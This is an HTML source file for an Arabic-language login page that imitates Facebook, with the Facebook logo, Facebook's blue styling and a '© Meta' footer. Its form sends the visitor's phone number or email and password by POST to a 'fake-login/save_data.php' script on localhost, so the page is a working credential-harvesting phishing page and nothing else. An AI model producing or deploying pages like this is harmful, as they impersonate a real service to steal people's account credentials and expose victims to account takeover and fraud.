<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #e7f3ff, #ffffff);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #ffffff;
            border-radius: 10px;
            padding: 20px;
            width: 300px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            width: 50px;
            margin-bottom: 20px;
        }
        .input-box {
            margin-bottom: 15px;
            text-align: right;
        }
        .input-box input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .button {
            background-color: #1877f2;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 100%;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #145dbf;
        }
        .link {
            margin-top: 15px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
        .meta {
            margin-top: 20px;
            font-size: 12px;
            color: #606770;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
        <form action="http://localhost/fake-login/save_data.php" method="POST">
            <div class="input-box">
                <input type="text" name="phone" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
            </div>
            <div class="input-box">
                <input type="password" name="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="button">تسجيل الدخول</button>
        </form>
        <a href="#" class="link">هل نسيت كلمة السر؟</a>
        <a href="#" class="link">إنشاء حساب جديد</a>
        <div class="meta">© Meta</div>
    </div>
</body>
</html>
